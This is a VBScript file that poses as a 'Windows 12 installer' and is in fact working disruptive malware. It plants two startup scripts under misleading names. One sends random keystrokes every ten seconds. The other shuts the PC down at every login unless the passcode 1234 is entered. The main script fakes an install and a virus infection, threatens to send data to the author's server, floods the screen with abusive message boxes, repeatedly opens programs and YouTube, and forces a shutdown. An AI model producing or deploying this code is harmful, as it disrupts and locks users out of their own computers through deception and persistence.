Option Explicit
Dim ws, Site, WshShell, i, objShell, objFSO, strStartupPath, objFile, strScriptContents
Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
Dim wsh : Set wsh = CreateObject("Wscript.Shell") 
Set WshShell = CreateObject("WScript.Shell")   
set ws = CreateObject("wscript.shell")
Set objShell = WScript.CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
strStartupPath = objShell.SpecialFolders("Startup")
Dim args : Set args = WScript.Arguments
Dim this : this = WScript.ScriptFullName
Dim id, ans


' Simulate pressing a random key every 10 seconds
strScriptContents = "Dim passcode"
strScriptContents = strScriptContents & vbCrLf & "passcode = InputBox(""Add code to delete virus from registry"")"
strScriptContents = strScriptContents & vbCrLf & "If passcode = ""1234"" Then"
strScriptContents = strScriptContents & vbCrLf & "    Set objFSO = CreateObject(""Scripting.FileSystemObject"")"
strScriptContents = strScriptContents & vbCrLf & "    strScriptPath = WScript.ScriptFullName"
strScriptContents = strScriptContents & vbCrLf & "    objFSO.DeleteFile strScriptPath"
strScriptContents = strScriptContents & vbCrLf & "Else"
strScriptContents = strScriptContents & vbCrLf & "    MsgBox ""Wrong!"", 64, ""error"""
strScriptContents = strScriptContents & vbCrLf & "End If"
strScriptContents = strScriptContents & vbCrLf & "Do"
strScriptContents = strScriptContents & vbCrLf & "    WScript.Sleep 10000 ' Sleep for 10 seconds"
strScriptContents = strScriptContents & vbCrLf & "    Set objShell = CreateObject(""WScript.Shell"")"
strScriptContents = strScriptContents & vbCrLf & "    objShell.SendKeys ChrW(Int((90 - 65 + 1) * Rnd + 65)) ' Sends a random uppercase letter"
strScriptContents = strScriptContents & vbCrLf & "Loop"
' Create a new script file in the startup folder
Set objFile = objFSO.CreateTextFile(objFSO.BuildPath(strStartupPath, "System 32, recovery.vbs"), True)
objFile.Write strScriptContents
objFile.Close






' Define the content for the new script with message box and deletion option
strScriptContents = strScriptContents & vbCrLf & "    objShell.Run ""shutdown.exe -s -t 840"", 0, True"
strScriptContents = "Dim passcode"
strScriptContents = strScriptContents & vbCrLf & "passcode = InputBox(""Add code to delete virus from sytem32"")"
strScriptContents = strScriptContents & vbCrLf & "If passcode = ""1234"" Then"
strScriptContents = strScriptContents & vbCrLf & "    Set objFSO = CreateObject(""Scripting.FileSystemObject"")"
strScriptContents = strScriptContents & vbCrLf & "    strScriptPath = WScript.ScriptFullName"
strScriptContents = strScriptContents & vbCrLf & "    objFSO.DeleteFile strScriptPath"
strScriptContents = strScriptContents & vbCrLf & "Else"
strScriptContents = strScriptContents & vbCrLf & "    Set objShell = CreateObject(""WScript.Shell"")"
strScriptContents = strScriptContents & vbCrLf & "    objShell.Run ""shutdown.exe -s -t 0"", 0, True"
strScriptContents = strScriptContents & vbCrLf & "End If"

' Create a new script file in the startup folder
Set objFile = objFSO.CreateTextFile(objFSO.BuildPath(strStartupPath, "StartScreensaver.vbs"), True)
objFile.Write strScriptContents
objFile.Close

'create message boxes
If args.count = 0 Then
	Msgstack"Start Installing Windows 12 (auto starting in 3 seconds) ",vbInformation+vbOKCancel,"windows 12 installer", 9
	WScript.Sleep(3000)
	Msgstack"installing",vbCritical,"windows 12 installer", 90
	WScript.Sleep(2000)
	msgstack"failed",vbCritical,"windows 12 installer", 93
	WScript.Sleep(2000)
	msgstack"rebooting",vbCritical	,"windows 12 installer", 91
	WScript.Sleep(5000)
	msgstack"Faild",vbCritical	,"windows 12 installer", 91
	msgstack"Faild",vbCritical	,"windows 12 installer", 91
	msgstack"Faild",vbCritical	,"windows 12 installer", 91
	msgstack"Faild",vbCritical	,"windows 12 installer", 91
	WScript.sleep(5000)
	msgstack"updater installed successfully",vbCritical	,"windows 12 installer", 91
	WScript.Sleep(2000)
	msgstack"Installing malware",vbCritical	,"windows 12 installer", 91
	msgstack"Your Pc is damaged. You have 3sec to close this from the task manager till all your data will be transform to my server.",vbCritical	,"VIRUS.EXE", 91
	WScript.Sleep(5000)
	msgstack"3",vbCritical	,"countdown", 91
	WScript.Sleep(1000)
	msgstack"2",vbCritical	,"countdown", 91
	WScript.Sleep(1000)
	msgstack"1",vbCritical	,"countdown", 91
	WScript.Sleep(1000)

	
	msgstack"YOU FUCKED!!!",vbCritical	,"Pc destryer", 92
	WScript.Sleep(10000)
	msgstack"systemfaild",vbCritical	,"virus", 92
	WScript.Sleep(5000)
	msgstack"trying to active antivirus",vbCritical	,"system", 92
	WScript.Sleep(2000)
	msgstack"faild",vbCritical	,"system", 92
	WScript.Sleep(2000)
	msgstack"it looks like that a virus is trying to damage your computer",vbCritical	,"system", 92
	WScript.Sleep(2000)
	For i = 1 To 20
		msgstack"YOU FUCKED!!!",vbCritical	,"Pc destryer", 80
		Next
	ws.run("iexplore.exe" &" "& Site) 
		For i = 1 To 5
    ws.Run "notepad.exe"
     Next
		ws.run("iexplore.exe" &" "& Site) 
		For i = 1 To 5
		ws.Run "https://www.youtube.com"
		WshShell.SendKeys "^{ESC}"
		Next
		ws.run("iexplore.exe" &" "& Site) 
		For i = 1 To 5
		WshShell.Run "excel.exe"
		WshShell.SendKeys "^{ESC}"
		Next
		ws.run("iexplore.exe" &" "& Site) 
		WshShell.SendKeys "^{ESC}"
		For i = 1 To 30
		msgstack"YOU FUCKED!!!",vbCritical	,"Pc destryer", 80
		WshShell.SendKeys "^{ESC}"
		Next
		For i = 1 To 5
		ws.Run "https://www.youtube.com"
		WshShell.SendKeys "^{ESC}"
		Next
		ws.run("iexplore.exe" &" "& Site) 
		For i = 1 To 5
		WshShell.Run "excel.exe"
		WshShell.SendKeys "^{ESC}"
		Next
		ws.run("iexplore.exe" &" "& Site) 
		WshShell.SendKeys "^{ESC}"
		For i = 1 To 30
		msgstack"YOU FUCKED!!!",vbCritical	,"Pc destryer", 80
		WshShell.SendKeys "^{ESC}"
		Next
		For i = 1 To 5
		ws.Run "https://www.youtube.com"
		WshShell.SendKeys "^{ESC}"
		Next
		ws.run("iexplore.exe" &" "& Site) 
		For i = 1 To 5
		WshShell.Run "excel.exe"
		WshShell.SendKeys "^{ESC}"
		Next
		ws.run("iexplore.exe" &" "& Site) 
		WshShell.SendKeys "^{ESC}"
		For i = 1 To 30
		msgstack"YOU FUCKED!!!",vbCritical	,"Pc destryer", 80
		WshShell.SendKeys "^{ESC}"
		Next
		For i = 1 To 5
		ws.Run "https://www.youtube.com"
		WshShell.SendKeys "^{ESC}"
		Next
		ws.run("iexplore.exe" &" "& Site) 
		For i = 1 To 5
		WshShell.Run "excel.exe"
		WshShell.SendKeys "^{ESC}"
		Next
		ws.run("iexplore.exe" &" "& Site) 
		WshShell.SendKeys "^{ESC}"
		For i = 1 To 30
		msgstack"YOU FUCKED!!!",vbCritical	,"Pc destryer", 80
		WshShell.SendKeys "^{ESC}"
		Next
		objShell.Run "shutdown -s -t 0"
	
	
'return values for message boxes	
ElseIf args.count = 2 Then 
	id = CInt(args(0))
	ans = CInt(args(1))
	
	'msgbox with id 1
	If id = 92 Then 
		
		
	
	'msgbox with id 2
	ElseIf id = 2 Then 
	
		
		
	End If 
	
	'msgbox with id 3
	'if statement here if you want a return
	

End If


'Function for no wait message boxes with return values.
Function MsgStack(message, options, title, id)
	Dim temp
    temp = fso.GetSpecialFolder(2) & "\" & Replace(fso.GetTempName, "tmp", "vbs")
  	  	
 	With fso.CreateTextFile(temp)
 		.WriteLine "return = MsgBox(""" & message & """, " & options & ", """ & title &""")"
 		.WriteLine "CreateObject(""WScript.Shell"").Run """ & this & " "" & " & id & " & "" "" & return"
 		.WriteLine "CreateObject(""Scripting.FileSystemObject"").DeleteFile """ & temp & """, True"
 		.Close
 	End With
 	wsh.Run temp
End Function

